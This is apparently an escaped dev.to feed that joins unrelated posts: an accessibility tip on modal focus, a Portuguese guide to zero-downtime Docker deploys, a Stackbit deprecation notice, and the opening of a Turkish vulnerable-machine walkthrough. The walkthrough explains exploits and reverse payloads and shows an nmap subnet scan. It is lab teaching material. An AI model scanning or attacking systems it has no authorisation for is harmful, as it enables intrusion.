&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--MTpYVRqs--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.substack.com/image/fetch/w_1456%2Cc_limit%2Cf_auto%2Cq_auto:good%2Cfl_progressive:steep/https%253A%252F%252Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%252Fpublic%252Fimages%252F382c6125-e6a0-45d3-97d8-929b423f33f3_1080x1080.jpeg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--MTpYVRqs--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.substack.com/image/fetch/w_1456%2Cc_limit%2Cf_auto%2Cq_auto:good%2Cfl_progressive:steep/https%253A%252F%252Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%252Fpublic%252Fimages%252F382c6125-e6a0-45d3-97d8-929b423f33f3_1080x1080.jpeg" alt="A search is created using the form element with the search role is good solution" width="880" height="880"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#thinking-about-a-main-and-additional-goal-when-we-work-with-focus"&gt;
  &lt;/a&gt;
  Thinking about a main and additional goal when we work with focus
&lt;/h2&gt;

&lt;p&gt;Did you think sometimes about how better to move focus when users open elements such as modals or dialogs? &lt;/p&gt;

&lt;p&gt;I think there is a main and additional goal when we work with focus. The main goal is what users want to do after moving focus for reaching their goals using a minimal number of actions. An additional is what they can do something else.&lt;/p&gt;

&lt;p&gt;Let's consider what I mean using the case of selecting a language on Booking. If we push the button of selecting a language we'll see modal with languages. &lt;/p&gt;

&lt;p&gt;Focus will move on the close button. Nice what we can close modal by pushing the enter key. But is that why we open the modal? No, we wanted to select a language. That's the main goal. And closing a modal is an additional goal.&lt;/p&gt;

&lt;p&gt;Now let's look at what Booking suggests for selecting a language. If we use only a keyboard we have to use the tab, ↑ or ↓ keys to start moving between languages. &lt;/p&gt;

&lt;p&gt;Then we push the same keys again until we find the necessary option.  If we push the enter key we'll select a language. Well, that's a nice solution but I want to suggest another. &lt;/p&gt;

&lt;p&gt;We have already identified that users open the modal because they want to select a language. It's the main goal. So we should give that to them. I think we can do that if we move focus on the current language. &lt;/p&gt;

&lt;p&gt;Then we should make the possibility of moving between languages using tab, ↑, →,  ↓ or ← keys immediately. The selection of a language we'll make using the enter key.  Also, we'll save the possibility of closing the modal using the Esc key like Booking made.&lt;/p&gt;

&lt;p&gt;I hope I was able to pass on the importance of defining a main and additional goal when you work with focus. Please, think about it and your interfaces will be user-friendly. &lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#a-highcontrast-background-color-is-a-simple-way-for-improving-content-accessibility"&gt;
  &lt;/a&gt;
  A high-contrast background color is a simple way for improving content accessibility
&lt;/h2&gt;

&lt;p&gt;In modern web design, we often meet with media content. Yes, that's a great way to draw users' attention. But we can make the mistake that will affect content accessibility. &lt;/p&gt;

&lt;p&gt;Loading of media content takes some time. At this moment, elements might be mixed with the page background color. As a result, users can't interact with them. They will be confused. &lt;/p&gt;

&lt;p&gt;For fixing this problem, we should add a high-contrast background color using the background-color property to the element with media content. Thus users will see all content and can interact with it.&lt;/p&gt;

      <title>Os cuidados para um deploy "Zero Down Time"</title>
      <author>Leonardo Lemos</author>
      <pubDate>Tue, 07 Dec 2021 21:36:15 +0000</pubDate>

      <guid>https://dev.to/convenia/os-cuidados-para-um-deploy-zero-down-time-5a3</guid>
      <description>&lt;p&gt;Atualmente existem ferramentas que nos ajudam a executar containers em produção e a maioria delas trazem funcionalidades preciosas como "Health Checks", "Limite de recursos" e até mesmo prometem um deploy &lt;a href="https://avikdas.com/2020/06/30/scalability-concepts-zero-downtime-deployments.html"&gt;"Zero Down Time"&lt;/a&gt;, o foco deste post é nesse último Item. Na &lt;a href="https://convenia.com.br/"&gt;Convenia&lt;/a&gt; utilizamos o &lt;a href="https://docs.docker.com/engine/swarm/"&gt;Docker Swarm&lt;/a&gt; para gerenciar alguns containers em produção e o Docker Swarm entrega esse tipo de deploy "Zero Down Time" através de uma simples configuração, porém após alguns testes em uma API sob stress constatamos que sempre ocorriam alguns erros no momento do deploy. Aprofundando a análise do que poderia causar esses erros, percebemos que podemos cometer alguns "equívocos" que nos impedem de ter um deploy verdadeiramente sem Down Time e ainda podemos constatar que esses "equívocos" são comuns em outras ferramentas como &lt;a href="https://kubernetes.io/pt-br/"&gt;Kubernetes&lt;/a&gt; também, dai saiu a motivação para escrever esse post.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#graceful-shutdown"&gt;
  &lt;/a&gt;
  Graceful ShutDown
&lt;/h2&gt;

&lt;p&gt;A grosso modo podemos definir "Graceful shutdown" como a maneira "natural" em que um processo é desligado. Muitos processos abrem sockets e trabalham com estado em memória então para esses processos desligarem naturalmente muito provavelmente eles vão fechar as conexões abertas e persistirem o estado, que está na memória, no HD para que não haja perda de dados e para poder retomarem as atividades sem maiores problemas quando forem reiniciados, em uma queda de energia por exemplo, os processos não tem esse privilégio, nesse caso podemos nos deparar com erros durante a próxima inicialização do processo, isso é conhecido como "Hard Shutdown".&lt;/p&gt;

&lt;p&gt;A boa notícia é que todos os softwares mais difundidos fazem isso por padrão, o &lt;a href="https://www.nginx.com/"&gt;nginx&lt;/a&gt; quando recebe o "sinal" de desligamento espera a resposta de todos os requests que estão em execução no momento, antes de desligar de fato. Esse "Graceful Shutdown" é importante porque o deploy consiste na "troca" de um processo com a versão antiga do software pelo mesmo processo contendo a versão nova, ao desligar o processo contendo a versão antiga, os requests que estiverem em execução não podem falhar, pois eles ainda estão sendo respondidos pelo processo antigo enquanto os novos requests já estão sendo servidos pelo processo novo como mostrado na imagem abaixo.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--kti9Rd0V--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ft293jsqsbem1iyh7dbf.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--kti9Rd0V--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ft293jsqsbem1iyh7dbf.png" alt="Troca dos containers em um deploy" width="741" height="362"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Na &lt;a href="https://convenia.com.br"&gt;Convenia&lt;/a&gt; temos muitos listeners feitos com o &lt;a href="https://convenia.github.io/Pigeon/#/"&gt;Pigeon&lt;/a&gt;, nesse caso não estamos falando de um webserver e sim de um &lt;a href="https://convenia.github.io/Pigeon/#/EVENT_DRIVEN?id=listening-for-events"&gt;consumer&lt;/a&gt; que "ouve" uma fila do &lt;a href="https://www.rabbitmq.com/"&gt;RabbitMQ&lt;/a&gt;, você já deve imaginar que para "ouvir" essa fila temos que ter uma conexão aberta com o &lt;a href="https://www.rabbitmq.com/"&gt;RabbitMQ&lt;/a&gt; então nada mais justo que fechar as conexões no momento em que o processo for desligado, é justamente isso que o &lt;a href="https://convenia.github.io/Pigeon/#/"&gt;Pigeon&lt;/a&gt; faz no código a seguir:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;    &lt;span class="k"&gt;protected&lt;/span&gt; &lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="n"&gt;listenSignals&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt;
    &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nb"&gt;defined&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'AMQP_WITHOUT_SIGNALS'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;?:&lt;/span&gt; &lt;span class="nb"&gt;define&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'AMQP_WITHOUT_SIGNALS'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

        &lt;span class="nb"&gt;pcntl_async_signals&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

        &lt;span class="nb"&gt;pcntl_signal&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;SIGTERM&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$this&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'signalHandler'&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
        &lt;span class="nb"&gt;pcntl_signal&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;SIGINT&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$this&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'signalHandler'&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
        &lt;span class="nb"&gt;pcntl_signal&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;SIGQUIT&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$this&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'signalHandler'&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;

    &lt;span class="k"&gt;public&lt;/span&gt; &lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="n"&gt;signalHandler&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$signalNumber&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;switch&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$signalNumber&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="no"&gt;SIGTERM&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;  &lt;span class="c1"&gt;// 15 : supervisor default stop&lt;/span&gt;
                &lt;span class="nv"&gt;$this&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="nf"&gt;quitHard&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
                &lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
            &lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="no"&gt;SIGQUIT&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;  &lt;span class="c1"&gt;// 3  : kill -s QUIT&lt;/span&gt;
                &lt;span class="nv"&gt;$this&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="nf"&gt;quitHard&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
                &lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
            &lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="no"&gt;SIGINT&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;   &lt;span class="c1"&gt;// 2  : ctrl+c&lt;/span&gt;
                &lt;span class="nv"&gt;$this&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="nf"&gt;quit&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
                &lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Nesse código definimos handlers para os sinais de desligamento que o processo pode receber e chamamos os métodos &lt;code&gt;quit()&lt;/code&gt; e &lt;code&gt;quitHard()&lt;/code&gt; que têm como objetivo fechar a conexão com o RabbitMQ. Até agora falamos muito sobre esses sinais que os processos podem receber de outro processos, ou até mesmo do kernel, mas caso você não estaja familiarizado ou se não souber exatamente a diferença entre eles, você pode ficar um pouco mais por dentro &lt;a href="https://www.ctl.io/developers/blog/post/gracefully-stopping-docker-containers/"&gt;nesse artigo&lt;/a&gt;.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#pid-1"&gt;
  &lt;/a&gt;
  PID 1
&lt;/h2&gt;

&lt;p&gt;Quando utilizamos &lt;a href="https://www.docker.com/"&gt;docker&lt;/a&gt; para executar nossa aplicação em produção e fazemos um deploy, um container com a nova versão da aplicação é iniciado,o container com a versão antiga da aplicação recebe o sinal "SIGTERM" que é um pedido formal de desligamento, caso o container demore mais que 10 segundos para  desligar ele será morto, logo o processo dentro do container tem 10 segundos para fazer o seu "Graceful Shutdown". A grande pegadinha é que dentro do container apenas o processo de ID 1 vai receber esse sinal, se dentro do container iniciarmos um outro processo antes da nossa aplicação, esse processo vai portar o id 1 e não a nossa aplicação. Agora que temos outro processo recebendo os sinais de desligamento no lugar da nossa aplicação, nunca vamos ter a oportunidade de fazer um Graceful Shutdown porque nunca saberemos o momento de desligar, por mais que esse pareça um erro bobo na verdade isso acaba acontecendo com uma certa frequência como por exemplo nos &lt;a href="https://docs.docker.com/engine/reference/builder/"&gt;Dockerfiles&lt;/a&gt; a seguir:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight docker"&gt;&lt;code&gt;&lt;span class="k"&gt;FROM&lt;/span&gt;&lt;span class="s"&gt; nginx:latest&lt;/span&gt;

&lt;span class="k"&gt;ENTRYPOINT&lt;/span&gt;&lt;span class="s"&gt; ["nginx", "-g", "daemon off;"]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;O Dockerfile acima está com o &lt;code&gt;ENTRYPOINT&lt;/code&gt; no formato de array, se você entrar dentro do container gerado por esse Dockerfie e executar o comando &lt;code&gt;pstree&lt;/code&gt; verá o seguinte output:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--_7H596n2--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/du8k1y9gv6pgpl7bii58.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--_7H596n2--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/du8k1y9gv6pgpl7bii58.png" alt="Output do comando pstree em um container corretamente configurado" width="756" height="444"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Perceba que o "nginx" é o primeiro processo mais a esquerda, isso significa que atingiremos o objetivo de ter um Graceful Shutdown visto que o nginx vai receber os sinais pessoalmente e ele sabe muito bem como lidar, para tirar a dúvida podemos executar um &lt;code&gt;docker stop&lt;/code&gt; no container em execução e provavelmente veremos o container sendo desligado quase instantaneamente.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight docker"&gt;&lt;code&gt;&lt;span class="k"&gt;FROM&lt;/span&gt;&lt;span class="s"&gt; nginx:latest&lt;/span&gt;

&lt;span class="k"&gt;ENTRYPOINT&lt;/span&gt;&lt;span class="s"&gt; nginx -g 'daemon off;'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;A Mudança no dockerfile acima foi sutil, mas faz toda a diferença, com a sintaxe corrida do &lt;code&gt;ENTRYPOINT&lt;/code&gt; o comando em questão é executato pelo shell dentro do container, segue o output do &lt;code&gt;pstree&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--1i-Qiwoa--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/7d1x9fa3ekg7ei2x0oll.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--1i-Qiwoa--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/7d1x9fa3ekg7ei2x0oll.png" alt="output do comando pstree em um container mal configurado" width="756" height="444"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Agora o processo mais a esquerda é o &lt;code&gt;sh&lt;/code&gt;, ele quem receberá os sinais de desligamento e por acaso não sabe muito bem o que fazer com esses sinais, se você executar um &lt;code&gt;docker stop&lt;/code&gt; nesse container verá que demora 10 segundos para parar, dessa forma não faremos o "Graceful Shutdown" e nunca teremos um verdadeiro deploy "Zero Down Time" porque sempre que o container com a versão antiga do código morrer, vai levar os requests que estão em execução para a vala junto. Logo devemos nos assegurar que nosso processo está recebendo o sinal de desligamento corretamente.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#v%C3%A1rios-processos-no-mesmo-container"&gt;
  &lt;/a&gt;
  Vários processos no mesmo container
&lt;/h2&gt;

&lt;p&gt;É conceitualmente correto que o container contenha apenas um processo(PID 1), mas é relativamente comum aparecer a necessidade de executar mais de um processo no mesmo container. Tomando como exemplo uma aplicação &lt;a href="https://www.php.net/"&gt;PHP&lt;/a&gt;, que não é capaz de responder como uma aplicação completa(HTTP) apenas com o processo do &lt;a href="https://www.php.net/manual/pt_BR/install.fpm.php"&gt;PHP-FPM&lt;/a&gt;, pois necessita de um &lt;a href="https://www.nginx.com/resources/glossary/reverse-proxy-server/"&gt;reverse proxy&lt;/a&gt; como &lt;a href="https://www.apache.org/"&gt;apache&lt;/a&gt; ou &lt;a href="https://www.nginx.com/"&gt;nginx&lt;/a&gt; para isso, como poderíamos fazer um único container  contendo tanto nginx como php-fmp e que funcione como uma aplicação completa capaz de entender o protocolo HTTP? A própria &lt;a href="https://docs.docker.com/config/containers/multi-service_container/"&gt;documentação do docker nos traz algumas recomendações&lt;/a&gt; sendo que dentre elas a melhor seria utilizar o &lt;a href="http://supervisord.org/"&gt;supervisord&lt;/a&gt; como processo principal no container, cuidando dos outros processos. O supervisord é capaz de propagar os sinais de desligamento que recebe para os processos filhos, sendo assim tanto o nginx quanto o PHP-FPM terão a possibilidade de fazer um "Graceful Shutdown" assim que o supervisord receber o sinal SIGTERM.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#prioridade-dos-processos-dentro-do-container"&gt;
  &lt;/a&gt;
  Prioridade dos processos dentro do container
&lt;/h2&gt;

&lt;p&gt;Bom temos uma aplicação PHP sendo executada em produção e seguimos tudo que foi falado até agora, estamos executando tanto o php-fpm quanto o nginx, ambos rodando sobre o supervisord, porém por incrível que pareça estamos notando o erro &lt;code&gt;502&lt;/code&gt; durante o deploy. Isso acontece porque durante o deploy um novo container é criado e o supervisord simplesmente não sabe qual processo deve iniciar primeiro, se por acaso o nginx estiver pronto para receber um request, mas o php-fpm ainda não foi corretamente iniciado então temos um &lt;code&gt;502&lt;/code&gt;. Resolver esse problema de prioridade entre os processos é relativamente simples, o supervisord tem uma flag priority que tem o proposito de dizer quem é o processo de maior prioridade, entre outras palavras esse processo deve ser criado primeiro e morrer por último, a seguir segue uma configuração real de uma aplicação da &lt;a href="https://convenia.com.br"&gt;Convenia&lt;/a&gt; em produção:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;[supervisord]
nodaemon=true

[program:nginx]
command = nginx -c /etc/nginx/nginx.conf  -g 'daemon off;'
user = app
autostart = true
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
redirect_stderr=true

[program:php-fpm]
command = /usr/sbin/php-fpm7 -F
priority = 1
user = app
autostart = true
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
redirect_stderr=true
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Esse é um arquivo de configuração do supervisord, perceba a configuração do php-fpm &lt;code&gt;priority = 1&lt;/code&gt;, essa configuração vai instruir o supervisord a criar o php-fpm primeiro e a desligar ele por último, agora sim temos um deploy perfeito, sem downtime.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#conclus%C3%A3o"&gt;
  &lt;/a&gt;
  Conclusão
&lt;/h2&gt;

&lt;p&gt;Para alcançar um deploy perfeito não adianta simplesmente utilizar os orquestradores mais poderosos do mercado, precisamos tomar alguns cuidados com o nosso container e aplicação também:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Garantir que a aplicação é capaz de fazer um Graceful Shutdown&lt;/li&gt;
&lt;li&gt;Garantir que a aplicação está recebendo os sinais de desligamento corretamente, ou mantendo a aplicação como sendo o primeiro processo dentro do container, ou utilizando alguma ferramenta como o supervisord que propaga os sinais que ela recebe.&lt;/li&gt;
&lt;li&gt;Garantir que os processos estão sendo iniciados e desligados na ordem correta, caso o container rode mais de um processo.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Tomado esses cuidados estamos prontos para ter um deploy sem Downtime.&lt;/p&gt;

      <title>Heads up: Stackbit integration removal</title>
      <author>Ben Halpern</author>
      <pubDate>Tue, 07 Dec 2021 21:32:40 +0000</pubDate>
      <link>https://dev.to/devteam/heads-up-stackbit-integration-removal-2m11</link>
      <guid>https://dev.to/devteam/heads-up-stackbit-integration-removal-2m11</guid>
      <description>&lt;p&gt;Hey folks, this is a heads up that the special DEV/Stackbit integration &lt;a href="https://dev.to/settings/extensions"&gt;available in settings&lt;/a&gt; has stopped working and the reference to it will be removed shortly.&lt;/p&gt;

&lt;p&gt;A couple of years ago &lt;a href="https://dev.to/devteam/you-can-now-generate-self-hostable-static-blogs-right-from-your-dev-content-via-stackbit-7a5"&gt;we developed an integration that would allow folks to &lt;em&gt;automatically&lt;/em&gt; use DEV as a headless CMS for generating a Stackbit site&lt;/a&gt;. Making this possible in the first place was a big effort in data portability and trying to ensure DEV was not an all-consuming platform. We continue on this mission, but this specific very custom integration no longer fit the roadmap on either side. &lt;/p&gt;

&lt;p&gt;The specialized integration is going away, but there are &lt;em&gt;a lot&lt;/em&gt; of ways you can still hook up DEV to continue to act this way. For example, just a few weeks ago &lt;a class="mentioned-user" href="https://dev.to/vjnvisakh"&gt;@vjnvisakh&lt;/a&gt;
 posted this:&lt;/p&gt;


&lt;div class="ltag__link"&gt;
  &lt;a href="/vjnvisakh" class="ltag__link__link"&gt;
    &lt;div class="ltag__link__pic"&gt;
      &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--ZWskIlmd--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://res.cloudinary.com/practicaldev/image/fetch/s--_1S3ajsw--/c_fill%2Cf_auto%2Cfl_progressive%2Ch_150%2Cq_auto%2Cw_150/https://dev-to-uploads.s3.amazonaws.com/uploads/user/profile_image/97730/b14b4ca5-6281-42a1-a6d6-173b480c35cd.png" alt="vjnvisakh"&gt;
    &lt;/div&gt;
  &lt;/a&gt;
  &lt;a href="/vjnvisakh/devto-as-a-headless-cms-efb" class="ltag__link__link"&gt;
    &lt;div class="ltag__link__content"&gt;
      &lt;h2&gt;Dev.to as a headless CMS&lt;/h2&gt;
      &lt;h3&gt;Visakh Vijayan ・ Nov 6 ・ 2 min read&lt;/h3&gt;
      &lt;div class="ltag__link__taglist"&gt;
        &lt;span class="ltag__link__tag"&gt;#react&lt;/span&gt;
        &lt;span class="ltag__link__tag"&gt;#javascript&lt;/span&gt;
        &lt;span class="ltag__link__tag"&gt;#webdev&lt;/span&gt;
        &lt;span class="ltag__link__tag"&gt;#opensource&lt;/span&gt;
      &lt;/div&gt;
    &lt;/div&gt;
  &lt;/a&gt;
&lt;/div&gt;


&lt;p&gt;This was one of the few remaining bits of code that is super specialized for DEV. User-friendly integrations like this will return in a more generalized form in the future, in the meantime there are plenty of ways to use the API and existing tools to interact with DEV.&lt;/p&gt;

&lt;p&gt;You've probably noticed several deprecations lately. It's all in a larger effort to put more resources into the core functionality and make room for future extensibility. Of course, &lt;a href="https://github.com/forem/forem"&gt;everything we do is open source via Forem&lt;/a&gt; and free to use. We look forward to continued collaboration with the whole community.&lt;/p&gt;

      <title>Zafiyetli Makine Çözümü</title>
      <author>Berkay-Şen</author>
      <pubDate>Tue, 07 Dec 2021 21:03:35 +0000</pubDate>
      <link>https://dev.to/yusiber/zafiyetli-makine-cozumu-i6</link>
      <guid>https://dev.to/yusiber/zafiyetli-makine-cozumu-i6</guid>
      <description>&lt;p&gt;Zaafiyetli makine çözümümüze başlamadan önce birkaç kavramı teorik olarak bilmemiz gerekiyor.Örnek olarak Exploit,payload gibi kavramlara hakim olalım ki sızma testi işleminin mantığını kavrayabilelim.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Exploit Nedir?&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Exploit bilgisayar, yazılım, programlarda veyahutta&lt;br&gt;
bir sistemde, sistem açıklarından ya da programcının kod&lt;br&gt;
hatalarını kullanarak sisteme sızmaya veya sistemde istenmeyen hatalar oluşturmak için geliştirilmiş yazılımlar ve programlardır diyebiliriz.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Exploitler Neler Yapabilir&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Exploitler yetkimizin bulunmadığı bir sisteme izinsiz giriş yapmabilme,verileri çalabilme,verileri görüntüleme,bu verileri değiştirebilme, sistem üzerinde yetkili kullanıcılar oluşturabilme ,sistemin işleyişini yavaşlatabilme,işleyişi aksatabilme veyahutta devre dışı bırakabilme gibi özellikleri gerçekleştirebilirler.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Zero-Day Exploit Nedir?&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Zero-Day exploitler henüz daha açığı kapatılmamış,(yama yapılmamış)&lt;br&gt;
exploitlerdir.Hackerlar geliştirdikleri exploitlerin yayılmasını istemezler. Çünkü yayılırsa bu açık kapanacaktır.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Exploit Veritabanları&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;a href="https://www.rapid7.com"&gt;https://www.rapid7.com&lt;/a&gt;&lt;br&gt;
&lt;a href="https://www.exploit-db.com"&gt;https://www.exploit-db.com&lt;/a&gt;&lt;br&gt;
Bu ve bunun gibi sitelerin içerisinde bir çok exploit bulunmaktadır. Rapid7 Metasploit aracının içerisinde bulunan exploitlerin bulunduğu sitedir.Aynı exploitleri Metasploit aracında da bulabiliriz&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Payload Nedir ?&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Hedef sisteme exploit doğru bir şekilde uygulandıktan sonra hedefe yollanıp çalıştırılaması istenen yazılıma/modüle verilen addır. Bu modül sayesinde karşı tarafla bağlantımız sağlamış olup karşı tarafa göndereceğimiz gereken komutları bizden bekler/dinler ve modül sayesinde açmış olduğumuz servise gönderir ve bu komutların karşı tarafta çalışmasını sağlar.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Bind Payload Nedir?&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Bind payload türünde hedefin açık portundan içeriye sızılıp,bizim hedefe bağlanmamızı sağlayan payloadlardır. Biz karşı sisteme bağlandığımız için olası antivirüsler ve firewall’lar yakalayabilir.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Reverse Payload Nedir?&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Reverse payload türünde ise karşı hedef bizim cihazımıza bağlanarak sızma işlemi gerçekleştirilir. Karşı hedef bize bağlandığı için firewall ve antivürüslere yakalanma olasığı düşüktür.&lt;/p&gt;
&lt;h2&gt;
  &lt;a href="#s%C4%B1zma-i%CC%87%C5%9Flemine-giri%C5%9F"&gt;
  &lt;/a&gt;
  Sızma İşlemine Giriş
&lt;/h2&gt;

&lt;p&gt;İlk başta nmap aracı ile ağımızdaki cihazları tarayıp listeleyerek sızacağımız cihazın IP adresini bulalım.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;nmap 10.0.2.0/24 –T5
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;blockquote&gt;
&lt;p&gt;-T5 parametresi ile taramanın hızlı olmasını sağlıyoruz.&lt;/p&gt;
&lt;/blockquote&gt;

